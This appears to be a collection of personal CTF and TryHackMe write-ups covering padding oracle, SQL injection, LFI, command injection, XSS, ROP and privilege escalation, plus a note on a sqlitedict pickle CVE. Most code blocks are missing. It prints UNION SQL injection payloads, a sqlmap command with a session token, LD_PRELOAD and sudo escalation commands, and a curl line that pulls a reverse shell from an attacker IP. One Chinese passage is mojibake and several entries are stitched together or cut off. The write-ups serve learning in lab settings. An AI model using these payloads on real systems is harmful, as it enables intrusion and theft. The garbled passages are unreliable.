Maybe is time for a Padding Oracle Attack!

Padding Oracle

Wikipedia(link)

I put some threading magic on it to make it faster!
padding_oracle.py

After I extracted the data, I got my second flag and known that is a json format data!
{"flag": "^FLAG^5dc0bd44bc917ef1ab7e76de1be3f8d213c7d324acd52409b92ab8ce1764623e$FLAG$", "id": "2", "key": "FJRyMS3Ib4aor0M9RPTfcQ~~"}

Well, speaking honestly, I had a wrong idea that the CBC key is just the extracted key in the json data, but after I tried to decrypt the message directly through the IV value and that suspecious key, I known that Iâ€™m wrong QwQâ€¦

Bit flipping

I tried to modify the data into {"id":"1"}, and this can be done through a simple bit flipping attack.
Take a quick review on CBC MODE process:

Itâ€™s trivial that I can get the raw decrypted value for the first block (or any other block) of the oringinal ciphertext through an XOR operation with the IV value and the first block of the ciphertext.

So the flipping payload should be:
xor(initial_IV, b'{"flag": "^FLAG^', b'{"id":"1"}')+the_first_block_of_the_ciphertext

Flag 3:

SQL Injection

How can I do if I want to generate a payload with a length larger than 16?

A quick reminder:
Before moving forward to this, how to get the raw decrypted value for a block of any ciphertext?
Padding Oracle Again
Since itâ€™s feasible to decrypt any block, downbelow is my solving process:
take the last block of ciphertext as a value which I already known it's raw decrypted value.
->
The further block should be the xored value of the raw content I want to put with that block of ciphertext
->
decrypt the value of the further block
And after repeating these steps, I can modify any messages I want to put and try some SQL Injection!

solve.py
The wanted variable is the SQL Injection(Union base) payload in json format.

Gaining database names
{"id":"7 UNION SELECT group_concat(database()), 1"}

Gaining table names
{"id": "7 UNION SELECT group_concat(table_name), 1 FROM information_schema.tables WHERE table_schema=database()"}

Gaining column names for table tracking
{"id":"7 UNION SELECT group_concat(column_name), 1 FROM information_schema.columns WHERE table_name='tracking'"}

Extract Header datas from table tracking
{"id":"7 UNION SELECT group_concat(headers), 1 FROM tracking"}

And finally, go to the dumped url from table â€˜trackingâ€™ and get the last flag!

entry.title: My First CVE! Exploiting sqlitedict (CVE-2024-35515)
entry.content:
Before all

Impacted: sqlitedict <= 2.1.0

CVE-2024-35515

This vulnerability might cause via code excution locally.

I found out this vulnerability on 2024/05/07 while I was dealing with my school scientific project, and just reported it to TWCERT(They also have a service for cve reporting) the next day but got rejected because they only dealing with CVE about Taiwanese products. And I also sync this issue on github(But I guess the author wonâ€™t patch this vuln QwQ)

After that, I reported the same stuffs to MITRE, and received their reply on 2024/5/29.

Anyway, though this is not a BIG 0-day report, but is definitely a thrilling exprience for me, and give me lots of motivation!

How I exploit it?

pickle insecure deserialization

In a python class object, a __reduce__ method would be triggered with pickle.loads(deserialization) function.

So a malicious class dumped with pickle like this can cause via code excution when it loaded by pickle.loads.

code review with sqlitedict

https://github.com/piskvorky/sqlitedict/blob/master/sqlitedict.py

line 50~53
Importing dumps, loads function.

line 120~127
The insecure encode/decode functions.

And finally, in class SqliteDict:

the self.decode function is same as the previous decode function.

And the __getitem__ method is called with an â€˜aray-likeâ€™ identifying (for example : arr[1] is same as arr.__getitem__(1))

So I can generate a malicious sqlite file including the previous code excution pickle payload.

PoC_generator.py

PoC_open_sql.py

Result:

After all

owo?

Write up

RECON

port scan

command

Found out an interesting service on port 61777 (Apache Tika 1.17 Server)

Exploit

CVE-2018-1335

Exploiting Tika 1.17 server

After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.

Privilege Escalation

Exploiting AlwaysInstallElevated

I used PrivescCheck.ps1 script to check PE Vectors on this machine.

The AlwaysInstallElevated setting allows users to install msi file with adminâ€™s privilege and run it with the same privilege, either.

So, just spawn a vicious msi file with msfvenom:

Grep it with Victimâ€™s machine and run ~

Aha !

After all

My first pentesting on my New Ubuntu VM >w<

https://juggernaut-sec.com/alwaysinstallelevated/

åŸºæœ¬åŸç†

å…¶å¯¦è·Ÿ CTF WIKI å¹¾ä¹ä¸€æ¨£
æœ‰å€‹å¤šé …å¼$f$ä»¥åŠæ¨¡æ•¸$N$
æ­¤æ™‚ï¼Œå¿…é ˆè¦æœ‰æ¨¡æ•¸$N$æœ‰å€‹å› æ•¸$b$æ»¿è¶³$b \geq N^ eta$ï¼Œ$0< eta \leq1$ï¼Œè€Œ$f$çš„æœ€é«˜æ¬¡ç‚º$\delta$

å…¶ä¸­ï¼Œ$|x_0|\leq c N^{ rac{ eta^2}{\delta}}$
è€Œé€™è£¡é¢ä¸»è¦æ˜¯ä½¿ç”¨LLLç®—æ³•(è©³ç´°è«‹çœ‹latticesç« ç¯€)æ‰¾åˆ°å¤šé …å¼gæ»¿è¶³ï¼š

entry.title: Year of the Fox on TryHackMe
entry.content:
Before all

A fun and relaxing one, my second time to solve a HARD machine on TryHackMe.

Victimâ€™s IP : 10.10.150.100
Attackerâ€™s IP : 10.9.195.189

Write Up

RECON

port scan

Command:

Result:

well â€¦ a web service and a bunch of smb service, speaking honestly, I was shockedâ€¦â€¦(cause Iâ€™m not familiar with smb yet).

enum4linux

enum4linux is a tool being used to leak some informations from a vulnerable linux machine.
Command:

Result:
There was sooooo many informations leaked, but I only used this XD.

There are two UNIX users, fox and rescal.

Exploitation

http auth brute forcing

The web application on port 80 have a http auth, and I used hydra to brute force the password with usernames leaked by enum4linux
Command:

Result:

command injection

After accessing the web application, it looked like thisâ€¦â€¦.

It allows user to search for files, which give me an idea to use command injection attack.
Payload:

Of course, I opened port 1004 to receive shell from victim.

ssh brute forcing

Command:

Result:

wellâ€¦thereâ€™s a ssh service in innet, it would be easier to brute force the userâ€™s password from outnet.

So I wanted to download socat into victimâ€™s machine from my computer so I could open another port on victimâ€™s machine which pass through the innet ssh service, wellâ€¦â€¦.


Permission denied !
So I searched for folder with a writable permissionâ€¦
Command:


P.S. Donâ€™t forget to change permission for it~

The tmp folder can be used !
Now, is time to open ssh service to outnet with socat!
Command:

Finally, here brute forcing is~
Command:

Result:

Now log in with the informations~

Privilege Escalation

poweroff escalation

First of all, check my permission with sudo -l:

I setup a http server from it to find out how /usr/bin/shutdown workâ€¦â€¦
Reverse Engineering with ghidra:

â€¦â€¦.
well, well, wellâ€¦
After that, I searched for the poweroff command on GTFOBins

Nothing found.
WHAT?!!
And finally, I found out this:
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/
Command:

And finallyâ€¦ get root!!!
But what?

Kinda tricky(
Just a simple hide&see thoughâ€¦


Aha!

Soâ€¦
who can tell me the meaning of:

:>
ğŸ¦ˆğŸ‹ğŸ¦ˆğŸ‹

After all

Now stucked on Year of the Dog :<

entry.title: ConvertMyVideo on TryHackMe
entry.content:
Before all

Wellâ€¦ I was stucked at the last step of this box, after I searched otherâ€™s Write Up, I learned a new tool - pspy which can moniter linux processes without root.

Victimâ€™s IP : 10.10.3.97
Attackerâ€™s IP : 10.9.195.189

Write Up

RECON

port scan

Command:

Result:

nothing special thoughâ€¦

directory enumeration

Command:

Result:
The most interesting part is the admin directory which required http-get auth.

Exploitation

command injection

The web page look like this, and after some tries, I found out a vulnerability with command injection.

The interesting part is that it would block the space character and cut the post data with &(me crying out loud : is and not end!!!)
Anyway, is still easy to bypass by ${IFS}
Setting up a http server to make victim downloads the php reverse shell.

I opened it on port 10000

Listening on port 1004 and wait for the reverse shell work:

Command injection payload:

And just visit http://10.10.3.97:10000/reverse.php to get shell on port 1004

password cracking

Wellâ€¦although I donâ€™t know why I should do this, but I must do this to complete the challenge(

File:/var/www/html/admin/.htpasswd

Content:itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

Simple crack with john:
Command:

Result:

Privilege Escalation

pspy

https://github.com/DominicBreuker/pspy

Install it on victimâ€™s machine:

And after a while, I noticed that thereâ€™s a cronjob run with UID=0, which probably run by root

reverse shell again

Base on the cronjob discovered before, I edited the content of clean.sh to get a rootâ€™s shell.

Open port 5427 on my computer:

Finallyâ€¦

Get shell!!!

After all

I am still procrastinating on my write up for Year of the Fox on TryHackMe â€¦

Before all

While I was exploiting the blog lab on Tryhackme today, I was unable to exploit the wordpress site with cve 2019-8943 python poc, so I finally tried this out and succeeded.
There are still a lot of usage and methods I think, so this post would be updated in future.

entry.title: Hexo password testing
LD_PRELOAD and Mongo Notes
entry.content:
Before all

I learned these from Road on TryHackMe today

Notes

Mongo DB

It usually runs on port 27017

payloads(?):

Look for working services

MongoDB

LD_PRELOAD

LD_PRELOAD is a function allows any program to share libraries.

payloads:

shell.c

library compilation
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
add LD_PRELOAD with sudo
sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
In case of sudo result like this:

env_keep+=LD_PRELOAD

entry.title: The Marketplace CTF Writeup on TryHackMe
entry.content:
Before all

Coffee or tea or whale?
wellâ€¦you canâ€™t order the last one ğŸ¤£

Victim IP : 10.10.65.93
My IP : 10.8.211.34

Write Up

RECON

Nothing found but a port : 32768 with the same function as port : 80.

Web Exploitation

This is a simple market website, you can register your account and add new items.

XSS

After I tried out the add function, I noticed that thereâ€™s a XSS vulnerabilities:

Both of the alert worked, so itâ€™s time to report the payload to admin.
Though thereâ€™s no webhook.site to use, itâ€™s still feasible to set up a simple http server with python.
Source:

XSS Payload:


SQL Injection

After getting the adminâ€™s cookie, I found out a sql injection in admin panel.

sqlmap:
sqlmap --url "http://10.10.65.93/admin?user=1" --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA2MjkxMDN9.Lj9L2zuNLSAQE3btbfm_XZTgbJHKRPH7HOWk-fSbgyE' --technique=U --delay=2 --dump

And hereâ€™s the ssh password~

Privilege Escalation

Wildcard Injection

Here for more informations:link

Get shell on 5130:

Escalated to user michael.

Docker Escalation

GTFOBins

Get flag!!!

After all

Just a little bit tire and nervous now ><.

entry.title: dogcat CTF Writeup on TryHackMe
entry.content:
Before all

Wolf~
Meow~
Womp~
Thereâ€™s an imposter amoung us

Victim IP : 10.10.2.219
My IP : 10.8.211.34

Write Up

RECON

RECON isnâ€™t meaningful to this lab thoughâ€¦

Port Scanning

nmap

Path Searching

dirsearch

dirsearch -u http://10.10.2.219
And it found out an empty page : flag.php

Web Exploiting

This was a simple php site with two choices between dog and cat, and the most interesting part were their paths:
http://10.10.2.219/?view=dog
http://10.10.2.219/?view=cat
So it might had an LFI vulnerability.

LFI

I first tried out something like this:
http://10.10.2.219/?view=../../../../../../../etc/passwd
Well, I was blicked >:

It seems like the url parameter needed to contain cat or dog.
After a few minutes, I tried out something like this:
http://10.10.2.219/?view=dog/../cat

Hooray, this bypass was succeed.

LFI with php filter:
Click here for more informations
http://10.10.2.219/?view=php://filter/convert.base64-encode/resource=dog/../flag
The flag after base64 encoded appeared:

RCE with php filter chain:
Iâ€™ve wrote a simple RCE script based on this.
Source CODE:

PHP Reverse Shell

I first set up a http server with my revershell(reverse.php on port 1221) and ran this command through the filter chain shell:
curl http://10.8.211.34:1221/reverse.php -o shell.php
And the revershell was uploaded, source of php revershell:

Open the listener of my ip on port 5124 and the revershell on victem site:

Get shell!!!

Privilege Escalation

sudo -l

env escalation

GTFOBins
sudo env /bin/bash

Looking for flag:
find / | grep flag
it was in /root/flag3.txt

Container Escape

I learned this from otherâ€™s writeupğŸ˜…
Anyway, the site would run the file backup.sh in opt/backups every minute, so itâ€™s feasible to rewrite backup.sh into another revershell to escape container after a minute.

One minute later:

After all

Thanks for the nice container escape, I really learned from that XD.
How about my midterm examâ€¦â€¦.

entry.content:
Team Name:WAN

Link:https://2023.cakectf.com/teams/2247781930/

Before all

While I was at my school Feild Day, my team members(Aukro & Naup) in WAN invited me to participate in this CTF XD.
Beside the Welcome and Survey challenges, I solved two web challenges and Naup solved a pwn challenge this time, not bad though.

Write up

TOWFL

Solver : Whale120

An exam web application which would generate some strange sentences with unknow characters every time and you have to get flag by getting a full mark on it.
There are a hundred strange problems, after a try on this application with Burp Suite, I found out two key points:

  • The submition would be post to path /api/submit and the submission result can be get by path:/api/score. The statements would be the same every time if the sessions are the same.
  • It would return your score every time.
    So my solution is to enumerate the answer of a problem every time by sending packages with the same session and check whether itâ€™s right by the increase/decrease of score.
    about 400 tries, I finally get flag!!!
    Finall packets:
  • Submit
  • Get score Finall Result:My arms were almost broken by brute forcing through thisâ€¦

Country DB

Solver : Whale120

An simple web application use to search country ID by input two charaters every time.
Its backend is setup by sqlite3 and python flask, and it would filter user input by this:

Search query:

And I was stucked at here because I was thicking about SQL Injection with two characters
After about 30 minutes, I tried to send packages like this while I was testing sqlite and list container on python:

And there was a 500 error code but not 400, which means that this can passed the length filter!!!
So I constructed my payload into this:

Because python would consider the json of parameter code a list with legth 2, although sqlite canâ€™t accept a list like object, but it can be a string if I add a annotation -- in the middle of my payload. Base on these, this UNION SQL Injection payload is effective!
Finall Request:

vtable4b

Solver : Naup

C++ pwn with vtable.

simple signature

Solver : No one :<

server.py

I was stucking on cauculate the values of x or u or r, but not thinking about bypass the verification QAQ.
And I found out the solution after contest, which I change the signature value s into pow(2, (h(m)-1)*inverse(w, p-1), p) and signature value t into pow(2, inverse(-v, p-1), p), this can easily bypass the verification without knowing the value of every keysğŸ™ƒ.
Finall Result:

After all

We have only three members in our team and we arenâ€™t as professional as other teams, so a good experience and performance, keep going on!

entry.title: Block Cipher Mode note
entry.content:
Before all

A quick Block Cipher Mode review for myself.
All the exploits down below are for Labs made by Oalieno

Recommended Course

Block Cipher Mode

Cut and Paste Attack

EBC MODE vulnerability
Because in ECB mode, size of an block is always 16 bytes, so even though we canâ€™t crack it, itâ€™s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing
Exploit

Prepend Oracle

EBC MODE vulnerability
This method can be used when your input would be encrypted with message you want to encrpt
The main idea is to enumerate through characters until itâ€™s same with encrypted blocks generated from only padding input.
Exploit

Padding Oracle

CBC MODE vulnerability
This method can be used when itâ€™s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, itâ€™s necessary that there exist some clues to check whether the input is unpaded successfuly or not
The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!

How to cauculate the correct value after unpad successfuly?
that byte of data = Now_Trying ^ IV Value at that position ^ padding
cur=xor(k, iv[now], (16-now))+cur
cur = the decrypted block,
k = the value be tried now,
16-now = padding.
Exploit

entry.title: Return Oriented Program note
entry.content:
Before all

I had posted a note of pwn for beginners(link here), and recently Iâ€™ve learned more about ROP, so here is this post~

ROP

What is ROP?

ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).
Basically, a fragment end with ret is mostly used.

x86_64 ROP

In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx â€¦â€¦
To connect the ROP Chain, itâ€™s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as ROPgadget and pwntool.
ROPgadget:

In this command, I want to find a gadget start with mov_dword and end with ret.
but is much more easier to find a register fragment with pwntool.
pwntool

In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.

syscall table
syscall table has each register need for every call and the meaning for each register.
p.s. execve is excution call.
Connect fragment like pop rdi; ret with a value can modify the value of rdi and move to mext fregment(possibly a function or syscall)
An example for an excution syscall:

This ROP chain would make the value of rax become 0x3b(execve on syscall table), and rdi value become the address of shellcode(like string: /bin/sh\x00)
\x00 is a symbol to stop reading.
Also, vmmap in geb-peda is often used to find writable(or something else) datas.

x86 ROP

Same logic as x86_64
syscall table
Some differents between x86 and x86_64:

  1. In x86 system, each address and register are mostly 4 bytes
  2. int80 in x86 has the same function with syscall in x86_64
    Example:
    execve in x86:

Challenges

Pwnasm from LoTuX CTF

Click link
Itâ€™s a simple ROP
Solution
Start with pwntool:

Extracted datas:

Itâ€™s a x86_64 system(amd64), so check out the syscall table ,register gadgets needed to trigger syscall are rax, rdi, rsi, rdx.
Also, from the reverse result by Ghidra
there are some weird datas on the stack(our shell('/bin/sh' at0x00402000) and first part of flag), so itâ€™s possible to construct an ROP Chain and excuse the shell

Extracted datas:

Finally, my exploit code:

echo server

file
source code
A x86_64 file
ROP Chain:
pop rdi; ret->change rdi location to global variable->trigger get function->return to runCMD function to bypass getString() filtering function
Exploit:

rop1-sean_Pwn-2

file
Stack Migration

Stack Migration

Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if itâ€™s a x86_64 system)/first 4 bytes(if itâ€™s a x86 system) need to be a location for new register(garbage)

Solution

First write the ROP Chain into global variable, and trgger it in func1, remember to leave.

ropfu from picoCTF

link
An i386 (x86) system, key points are on above.
Use fragments like mov dword [edx] eax; ret to write shell on eax into location edx.
p.s.the shell input need to be converted into hex and reversed
exploit

MISC

PWN

ğŸ˜ Array of Sunshine â˜€ï¸



We can see an obvious bug scanf("%s",&fruit[v1])
and It didnâ€™t check if v1 is out of index
Also protection is Partial RELRO and fruit is a global variable.
So we know it has a GOT hijack

There is a win function which will $cat flag
and when print_sym !=MEMORY[0x404020] at the same time MEMORY[0x404020] is 0x6 (known by gdb)

I gonna hijack exit@got[plt] to win function
Because of NO-PIE we know exit@got[plt] at 0x405040, fruit at 0x405080 (It means exit@got[plt] is at fruit[-8])

slove script:

Flag:

sun{a_ray_of_sunshine_bouncing_around}

Flock of Seagulls ğŸ•Šï¸


With IDA decompiling I found out a function call chain
main->fun1->fun2->fun3->fun4->fun5
also it has a ret adr check chain (didnâ€™t check fuc1->main)
fun5->fun4->fun3->fun2->fun1-x>main
and a backdoor function call win


It gave us rsp and also has a huge BOF
with No PIE we can just write back the ret adr to bypass the check
and write func1's ret adr to win

I also use gdb to help me write bypass payload more easily

slove script:

Flag:

sun{here_then_there_then_everywhere}

Bug Spray ğŸ›ğŸª²ğŸ

First thing first we use IDA Decompile it
IDA_DECOMPILE
imo that IDA didnâ€™t decompile correctly
so i chose to oberserve the Assembly code


In this block we know we have RWX at 0x777777 and its size is 0x12c
also we know after this block
r10=r12=0x64

Our target is goto Lable:off for the rwx segment

Todo

At the top two blocks of this picture we know it hope the length we wrote is 0x44 or 0x45 (0x64 <= rax+20 < 0x66)

After that it do syscall, and we know 0x64 stands for sys_time, 0x65 stands for sys_ptrace, after testing we know only sys_ptrace is possible to return 0

So, weâ€™ll send 0x45 bytes
syscalltable

For serveral times testing, I finally found out that CANâ€™T get shell by calling execve("/bin/sh")
so i change to use orw and try to get flag

Finally I get the flag

btw the flag is at ./flag.txt

slove script:

Suddenly I lose (x

Now we know we have to do this with scripts
when i try pwntools I found out that it send \xe2\x87\xa6\xe2\x87\xa8\xe2\x87\xa6and things like that

just use python script to slove this

A site that woud press some links and play some frequency , the mission is to follow it every timeâ€¦
Solution:
After an observation on the js source, I noticed that the answers would store in an array called global_frequencies(but is the filename, also), and I just modifycurrent_frequencies_used_global into global_frequencies and also with some string implementation, and finally post it to path /flag with itâ€™s built-in function!

You can find websites online that can decompiler it.
https://www.toolnb.com/tools-lang-zh-TW/pyc.html

After entering a number, the head and tail will be removed, then cut into groups of four and then swap positions.

I tried to restore it, but it must have been written incorrectly.However, the string length is not long, so you can try it out by using loop.

After the End

Forensics

Low Effort Wav ğŸŒŠ

Author : å ‡å§¬Naup

After downloading, it looks like a .wav file, but it is actually a .png file.

Convert it back to PNG first

When I open it. The file seems to be cropped .It might be a Cropalyps

We used exiftool to find out that the phone model he used was Google Pixel 7
We can use acropalypse.app to restore the cropped part

Select pixel 7 and restore it

FLAG:sun{well_that_was_low_effort}

Reversing

First Date

Author : å ‡å§¬Naup

Unzip the file he gave you to get a pdx containing main.pdz pdxinfo

I studied the .pdz file and found some information.Playdate is a handheld video game console.
https://play.date/
Playdate game formats

  • luac - Lua bytecode
  • pdz - File container
  • pda - Audio file
  • pdi - Image file
  • pdt - Imagetable file
  • pdv - Video file
  • pds - Strings file
  • pft - Font file

Try to find a playdate related reverse tool and you will find one.
https://github.com/cranksters/playdate-reverse-engineering/tree/main
What is .pdz?

It has given a tool that can unpack all files from a .pdz
You can get a main.luac

Scripting

SimonProgrammer 2

Continue the idea of simon1.
Go grab the variable global_frequencies
You can get this.

After removing /static/ and .wav, base64 the string and remove the irrelevant characters at the beginning and end.

Just throw it to the console of F12 and it will get flag.

entry.title: NCKUCTF Write Up
entry.content:
Before all

This CTF for beginners just popped up on SCINT, and Iâ€™m so busy currently so I didnâ€™t participate the CTF seriously.
But some problems are interesting and I still learned from them, down below are the write ups~

Write Up

Preview Card

A gopher SSRF!!!
The main reason I want to have this writeup!
The home page of it has only two links, one is the flag but only localhost can read it, and the other is a kink like this:

I tried it and found out a XSS, and I was like, â€œWell, is ther an admin bot?â€
The answer is NO!
After many different tries, I gave it up and check out the hint:

Ok, ok, I know what is SSRF, but WTH is gopher.
Gopher is an protocal before http, which are commonly known for their extensive tunneling activities and their ability to destroy farms and gardens.(From wikipedia :D)
The exploit for this challenge is to send a post request asking for localhost by gopher and see the sesults from debug on the page.
link about gopher ssrf
payload generator
My first payload:

and i got a request like this:

Wellâ€¦. I have to post a data as givemeflag=yes

flag popped!!!

Jinja2

A SSTI (Server Side Template Injection), but since Iâ€™m not familiar with flask that much, so I googled the payloadâ€¦â€¦.
SSTI payloads
The principle of SSTI is that the frame Jinja2 would describe a string with this pattern ({{.*}}) as a template element, and it could be Inject by connect some builtin magics to become RCE
my payload:

The source:

Cat

An php serialization+command injection.
The soucre:

and I was provided a cookie like this:

What it looks like after base64 decoded:

I just wanted to chamge my payload cat_32337 into cat_322337'; ls echo 'a.
But that didnâ€™t work!
After a few minutes, I realized that it was a php serialization string, and in this payload, s:9:â€cat_32337â€ represent a string object, size of 9 and the value is â€œcat_32337â€, so I also need to change my size value XD
My payload:

What it looks like after base64 decoded:

Rahh!!!!

Yet Another Username Password Checker

Challenge file
This challenge allow two inputs, and itâ€™s without stack canary and PIE, so it allows an ret2shellcode exploit.
Method:
First make the global variable become a shellcode get from exploit-db, and ret to the shellcode by BOF while inputing the second variable.
My solve script:

p.s. Iâ€™m so cinfused that I consider ret2shellcode as a kind of BOF, but the flag and some other websites said that itâ€™s a kind of ROPâ€¦â€¦

bof

Challenge file
Just bof with ret2code~~~
My solve script:

puRely high School mAth

An RSA with five primes and a formula with five roots of the primes.
solution:phi(n)/totient(n)=f(1)*-1
An easy but quite creative one.
Challenge source:

datas:

solve script:

entry.title: Write Up for RSA challenges in picoCTF
LoTuX CTF WriteUp-Crypto
entry.content:
Before all

After I written the web writeups for it, itâ€™s time to have some cryptography~
LoTuXCTF.com

Write Up

Story Teller

Itâ€™s a system which you have to netcat to the machine and receive some strings of the story, a tricky point, the option 2 to show the entire story arenâ€™t availible, which took me some time to get the part containing the flag XD.
After receiving some strings, I guessed that was subtituition cipher, and I threw it into online solver :)
Solver link
Payload:

Plaintext(?)

Ahâ€¦ A little bit spelling mistake but I could fix that!
Flag:LoTuX{Cr4cK_TraNspOs1tion_c1ph3r}

Ultra Easy RSA

This is the RSA source code of it:

and this is the cipher text and public keys:

We can observe that the difference between p and q is low, so itâ€™s a good way to enumeration through the difference.

This was my solve script:

and finally, I got the flag:LoTuX{4sYmm3tR1c}

Bad Privacy

The source:

ciphertext:

Since the d is too small, the Wienerâ€™s Attack would work!(Maybe there would be a post in future talking about Wienerâ€™s Attack)
Wienerâ€™s Attack on Python
Online Solver
and the CRYING FLAG:
LoTuX{Oh_n0!_W1en3r_4t7@ck_M3!}
LMAO

Johnny

First of all, the shadow file in Linux will store all the passwordsâ€™ hash+salt and passwd file would record users and its home file location
In this challenge, I already got the passwd file + shadow file, so itâ€™s time to unshadow it:

after this step, I would like to use john + rockyou.txt to bruteforce the hash:

and the password revealed:

nc to the server and got the flag:

How is your math

I was saccrafied because I didnâ€™t know AES well at that time, but after a brain storming, I realized that its just a simple XOR XD
After connected to the server, some data would be retrieved

Since we can use XOR to cauculate new cipher text, is easy to write a solve script down below

FLAG: LoTuX{Bit_Flipping_is_a_usefull_skill!}
thx to the flag, I learned that the name of this skill is Bit Flipping

NPC

An LLL(Known High Bits Of p one)
link
gen.py:

which gave me the most parts of p, it allows an LLL attackâ€¦

entry.title: LoTuX CTF WriteUp-Web
entry.content:
Before all

I start my challenges on LoTuX CTF from May, and Iâ€™ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)
LoTuXCTF.com

Write Up

HTML

An e4sy challenge, start with a veiw source~

there were two hidden bottons doing functions cat() and magic(), so I typed it on console.
After that, I entered a page with a title This is a cute cat and a page called secret, and collected two partial flags LoTuX{fR0nT_ and 3nD_h1Dden_.
Finally, inspect the page secret again and there was also a hidden page which its path was flag.html.
Opened flag.html, and got the last part of flag Mes54ge}.

Usefull tools

Also a starter one
First I just opened the webpage and found out a hint called burp5u17e_ch4ll3nge
So I opened Burp Suite and caught a packet,and the header had an option called challenge with a value 0, so I just changed it into 1 and got a partial flag LoTuX{bd244966385a624 and a hint told me to use curl.
Next, sent a curl payload:

And received these informations:

So I changed the payload into this:

And some informations appeared:

So I used a OPTIONS to get its http method options, but nothing appeared, so I added an -i to my payload and saw the headers:

wellâ€¦ there was an option called H1DD3N_HT7P_ME7H0D, just sent a payload with it and I got the second part of flag:

received datas:

partial flag and a hint told me to try python request, this was my payload:

And FINALLY ended, quite a little bit tired bruh

Trending Cats

A site contained some meme cats, the links of the pictures were interseting:

So I used gobuster to crack the paths from 0000 to 9999 :

There was a hidden image:

With the word written on it(spin cat), just opened the path: http://lotuxctf.com:20003/spin.php, thereâ€™s a base 64 value aGFwcHk= on the button, changed it into the base64 of â€œspinâ€
And thereâ€™s cute flag~~~
LoTuX{Th3reR2kinds0fc4tv1dEos}

forum

First of all, I logged in as user with the account/password provided
Ok, there were some posts but only admin can edit itâ€¦
So I back to the login page and bypass the password with a simple SQL Injection payloads:

Aha, logged in successful and got the second(?!) part of flag at the first postâ€¦

So.. whereâ€™s my first flag XD
I was just stucked by here after ten minutes, I found out the first flag is at post0.phpâ€¦

What an IDOR ğŸ™ƒ

Cookie Stealer

An message board Web app which you can let the admin visit your post at your homepage.
I just used a xss payload down below and steal cookies with webhook.site.

and clicked â€œshare to adminâ€, back to the webhook site and got the flag~~
BTW, thereâ€™s also a XSS payload written in php if the site has some other protections:

and check the path logger.txt

Over!!!

LoTuX CTF Min 0

First, I used githacking to get the git file:

Then I moved to the file and checked out the logs:

Response:

Reset to the previous one:

there was a file: init.sql, I found the flag and also a sql injection for LoTuX CTF Min 1
flag:
LoTuX{Why_1s_thi$_per50n_sO_c4r3le5s?}

LoTuX CTF Min 1

By sql injection found at challenge 0, I used a UNION BASE SQL Injection Payload as a user name to register

And I got the flag.
LoTuX{Wh4t_@_maRv3l0u5_de$1gn_7h1s_1s?!?}

Blank Site 1

A BLANK site with only a picture, check out the url of it:

Maybe a LFI?

Aha! down below are the contents of it:

I got the flag, and also the path '/1d538e83d6f6b08f' to exploit boot id for Blank Site 2.

Image Uploader 1

An image upload web app, just sent a php backdoor XD.

I just visited the path and got rce, with simple observation I found out flag.txt(it was at there but now deleted by some auful challengers):

How2Login

Ah, my first thouhgt was like, â€œwellâ€¦just a sql injection bypass with 300 points(?!)â€.
Nope haha, so I opened my owasp and glimpse a path called test.php
(p.s. It could be found out with dirsearch but my owasp tool did this first XD)
And it was a site to check if user exist, and the link was just like this:

SQL Injection!!!
I opened sqlmap and used the payload:

And it was an Error-BASE SQL Injection and the data was hashed by sha256, but a weak password XD
data dumped:

Cute Flag: LoTuX{Inj3ct1on&HAAAsh}

THE EYE 2

Blank Site 2
